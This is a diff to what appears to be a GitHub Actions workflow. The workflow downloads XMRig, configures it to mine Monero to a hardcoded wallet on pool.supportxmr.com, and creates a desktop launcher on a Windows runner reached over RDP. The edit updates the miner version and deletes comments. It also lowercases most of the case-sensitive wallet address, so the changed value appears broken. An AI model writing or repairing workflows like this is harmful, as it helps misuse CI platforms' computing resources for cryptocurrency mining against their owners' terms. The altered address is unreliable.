@@ -31,7 +31,8 @@ jobs:
 
       - name: Install and Configure XMRig Miner
         run: |
-          $minerVersion = "6.24.0"
+          # CORRECTED: Updated to a valid XMRig version that exists for download.
+          $minerVersion = "6.21.2"
           $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
           $zipPath = "$env:TEMP\xmrig.zip"
           $extractPath = "C:\Users\RDP\Desktop"
@@ -45,7 +46,6 @@ jobs:
           $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
           
           Write-Host "Creating pre-filled config.json with your wallet address..."
-          # Create the JSON content in a YAML-safe way
           $jsonContent = '{' + `
             '"autosave": true,' + `
             '"cpu": true,' + `
@@ -55,17 +55,15 @@ jobs:
             '{' + `
             '"algo": "rx/0",' + `
             '"url": "pool.supportxmr.com:5555",' + `
-            '"user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",' + `
+            '"user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsyn3wede4o9ryebixumbccy5ocdoskks2u6t9gxjfzjnkxc7tj1uq4uky5bp",' + `
             '"pass": "x"' + `
             '}' + `
             ']' + `
             '}'
           
-          # Convert the JSON string to a properly formatted JSON object and save it
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
 
           Write-Host "Creating a 'Start Miner' shortcut on the Desktop..."
-          # Create the batch file content in a YAML-safe way
           $shortcutContent = "@echo off`r`necho Starting XMRig Miner...`r`ncd /d ""%~dp0""`r`ncd ""$($minerFolder.Split('\')[-1])""`r`nxmrig.exe`r`npause"
           Set-Content -Path (Join-Path $extractPath "Start-Miner.bat") -Value $shortcutContent
           
